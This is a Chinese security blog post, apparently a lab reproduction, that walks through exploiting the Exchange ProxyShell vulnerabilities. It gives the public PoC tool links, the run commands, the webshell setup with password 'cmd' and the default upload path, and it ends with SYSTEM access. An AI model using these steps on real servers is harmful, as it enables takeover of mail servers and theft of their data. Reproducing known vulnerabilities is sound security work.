@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="漏洞介绍国外安全研究人员在8月初公开了Microsoft Exchange多个高危漏洞（ProxyShell）利用的技术细节、PoC(概念验证代码)、EXP（漏洞利用代码）及利用视频。漏洞包括Exchange ACL绕过漏洞CVE-2021-34473、Exchange权限提升漏洞CVE-2021-34523和Exchange授权任意文件写入漏洞CVE-2021-31207）。 攻击者可通过组合使">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ProxyShell漏洞复现">
+<meta property="og:url" content="http://lvpsectime.github.io/post/5b800888.html">
+<meta property="og:site_name" content="忆时光">
+<meta property="og:description" content="漏洞介绍国外安全研究人员在8月初公开了Microsoft Exchange多个高危漏洞（ProxyShell）利用的技术细节、PoC(概念验证代码)、EXP（漏洞利用代码）及利用视频。漏洞包括Exchange ACL绕过漏洞CVE-2021-34473、Exchange权限提升漏洞CVE-2021-34523和Exchange授权任意文件写入漏洞CVE-2021-31207）。 攻击者可通过组合使">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://img.sectime.top/imgs/2021/09/9484ca149ed1729b.png">
+<meta property="og:image" content="https://img.sectime.top/imgs/2021/09/f51af1455550498d.png">
+<meta property="og:image" content="https://img.sectime.top/imgs/2021/09/ea3ad8256c1ed7e0.png">
+<meta property="og:image" content="https://img.sectime.top/imgs/2021/09/4b15881da1e169cf.png">
+<meta property="og:image" content="https://img.sectime.top/imgs/2021/09/20b39933c5dd901e.png">
+<meta property="og:image" content="https://img.sectime.top/imgs/2021/09/7dd9da649b4c8581.png">
+<meta property="og:image" content="https://img.sectime.top/imgs/2021/09/0a79122357ef06f4.png">
+<meta property="og:image" content="https://img.sectime.top/imgs/2021/09/bf5f492edbd9044b.png">
+<meta property="article:published_time" content="2021-09-26T06:17:10.000Z">
+<meta property="article:modified_time" content="2021-09-26T08:00:21.832Z">
+<meta property="article:author" content="ca5tle">
+<meta property="article:tag" content="漏洞复现">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img.sectime.top/imgs/2021/09/9484ca149ed1729b.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>ProxyShell漏洞复现</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="忆时光" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="http://img.sectime.top/">Img</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="http://github.com/lvpsectime">Projects</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post " href="/post/5d2c6350.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post " href="/post/58496fa8.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://lvpsectime.github.io/post/5b800888.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://lvpsectime.github.io/post/5b800888.html&text=ProxyShell漏洞复现"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://lvpsectime.github.io/post/5b800888.html&title=ProxyShell漏洞复现"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://lvpsectime.github.io/post/5b800888.html&is_video=false&description=ProxyShell漏洞复现"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ProxyShell漏洞复现&body=Check out this article: http://lvpsectime.github.io/post/5b800888.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://lvpsectime.github.io/post/5b800888.html&title=ProxyShell漏洞复现"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://lvpsectime.github.io/post/5b800888.html&title=ProxyShell漏洞复现"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://lvpsectime.github.io/post/5b800888.html&title=ProxyShell漏洞复现"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://lvpsectime.github.io/post/5b800888.html&title=ProxyShell漏洞复现"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://lvpsectime.github.io/post/5b800888.html&name=ProxyShell漏洞复现&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://lvpsectime.github.io/post/5b800888.html&t=ProxyShell漏洞复现"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">漏洞介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">2.</span> <span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">3.</span> <span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">4.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">5.</span> <span class="toc-text">漏洞利用</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        ProxyShell漏洞复现
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">ca5tle</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-09-26T06:17:10.000Z" itemprop="datePublished">2021-09-26</time>
+        
+        (Updated: <time datetime="2021-09-26T08:00:21.832Z" itemprop="dateModified">2021-09-26</time>)
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>国外安全研究人员在8月初公开了Microsoft Exchange多个高危漏洞（ProxyShell）利用的技术细节、PoC(概念验证代码)、EXP（漏洞利用代码）及利用视频。漏洞包括Exchange ACL绕过漏洞CVE-2021-34473、Exchange权限提升漏洞CVE-2021-34523和Exchange授权任意文件写入漏洞CVE-2021-31207）。</p>
+<p>攻击者可通过组合使用上述漏洞在未经身份验证的情况下远程接管目标服务器。由于Exchange服务器一般承载着使用者单位人员信息的秘密，员工账号信息、邮件数据都在其中，一旦Exchange服务器被控制，将会造成严重后果。</p>
+<p>由于国外安全研究人员将Exchange多个漏洞（ProxyShell）细节及部分PoC、EXP公开，意味着攻击者可根据这些技术细节披露的信息，在目标系统远程执行代码，使漏洞风险明显上升。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Microsoft Exchange Server 2010</span><br><span class="line">Microsoft Exchange Server 2013</span><br><span class="line">Microsoft Exchange Server 2016</span><br><span class="line">Microsoft Exchange Server 2019</span><br></pre></td></tr></table></figure>
+
+<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>ProxyShell是利用了Exchange服务器对于路径的不准确过滤导致的路径混淆生成的SSRF，进而使攻击者通过访问PowerShell端点。而在PowerShell端点可以利用Remote PowerShell来将邮件信息打包到外部文件，而攻击者可以通过构造恶意邮件内容，利用文件写入写出webshell，从而达成命令执行。</p>
+<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python &gt;= 3.8</span><br><span class="line">exchange的用户名</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>下载工具</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">生成webshell：https://github.com/Ridter/proxyshell_payload</span><br><span class="line">利用：https://github.com/dmaasland/proxyshell-poc</span><br></pre></td></tr></table></figure>
+
+<p>根据需要生成webshell，替换到proxyshell-poc中。默认情况下，生成的是一句话木马。</p>
+<p><img src="https://img.sectime.top/imgs/2021/09/9484ca149ed1729b.png"></p>
+<p>在proxyshell_payload.py中，修改末尾的webshell变量，将其替换为哥斯拉生成的aspx的webshell，需要注意的是经过测试CSharpDynamicPayload中的CSHAP_AES_BASE64，生成的webshell，需要将其中所有的Session替换成Application。</p>
+<p>运行proxyshell_payload.py，将encode之后的内容，复制到<code>proxyshell_rce.py</code>的 314 行：</p>
+<p><img src="https://img.sectime.top/imgs/2021/09/f51af1455550498d.png"></p>
+<p>运行<code>proxyshell_rce.py</code>，获取exchange的 powershell 管理shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3.8 proxyshell_rce.py -u https://10.10.10.150 -e exchange@god.local</span><br><span class="line"># -u excahnge的地址</span><br><span class="line"># -e exchange的用户名</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img.sectime.top/imgs/2021/09/ea3ad8256c1ed7e0.png"></p>
+<p>清理邮件导出请求(如果报错，多执行几次脚本即可)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Get-MailboxExportRequest</span><br><span class="line">Get-MailboxExportRequest|Remove-MailboxExportRequest -Confirm:$false</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img.sectime.top/imgs/2021/09/4b15881da1e169cf.png"></p>
+<p>执行<code>dropshell</code>，即可写入webshell，返回webshell的地址，连接密码：cmd</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dropshell </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img.sectime.top/imgs/2021/09/20b39933c5dd901e.png"></p>
+<p>使用菜刀连接shell</p>
+<p><img src="https://img.sectime.top/imgs/2021/09/7dd9da649b4c8581.png"></p>
+<p>查看权限是system</p>
+<p><img src="https://img.sectime.top/imgs/2021/09/0a79122357ef06f4.png"></p>
+<p>Proxyshell_rce可以根据自己的需要修改生成shell的路径，只需要修改225行和 236行的两行内容，将其对应。</p>
+<p>默认上传路径：C:\inetpub\wwwroot\aspnet_client</p>
+<p><img src="https://img.sectime.top/imgs/2021/09/bf5f492edbd9044b.png"></p>
+
+  </div>
+</article>
+
+
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+    <div id="vcomments" class="blog-post-comments"></div>
+    <script>
+        new Valine({
+            el: '#vcomments',
+            visitor: true,
+            appId: 'euAQjqlW2tS4fVHxsmyLkdLj-gzGzoHsz',
+            appKey: 'Fmn6CIIN9yyDif6AC2hxSglA',
+            placeholder: 'ヾﾉ≧∀≦)o来啊，快活啊!',
+            avatar: 'robohash'
+        })
+    </script>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="http://img.sectime.top/">Img</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="http://github.com/lvpsectime">Projects</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">漏洞介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">2.</span> <span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">3.</span> <span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">4.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">5.</span> <span class="toc-text">漏洞利用</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://lvpsectime.github.io/post/5b800888.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://lvpsectime.github.io/post/5b800888.html&text=ProxyShell漏洞复现"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://lvpsectime.github.io/post/5b800888.html&title=ProxyShell漏洞复现"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://lvpsectime.github.io/post/5b800888.html&is_video=false&description=ProxyShell漏洞复现"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ProxyShell漏洞复现&body=Check out this article: http://lvpsectime.github.io/post/5b800888.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://lvpsectime.github.io/post/5b800888.html&title=ProxyShell漏洞复现"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://lvpsectime.github.io/post/5b800888.html&title=ProxyShell漏洞复现"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://lvpsectime.github.io/post/5b800888.html&title=ProxyShell漏洞复现"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://lvpsectime.github.io/post/5b800888.html&title=ProxyShell漏洞复现"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://lvpsectime.github.io/post/5b800888.html&name=ProxyShell漏洞复现&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://lvpsectime.github.io/post/5b800888.html&t=ProxyShell漏洞复现"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2018-2022
+    ca5tle
+	
+  </div>
+  <div class="footer-miit"
+	<a href="https://beian.miit.gov.cn/" target="_blank">豫ICP备2021036264号</a>
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="http://img.sectime.top/">Img</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="http://github.com/lvpsectime">Projects</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
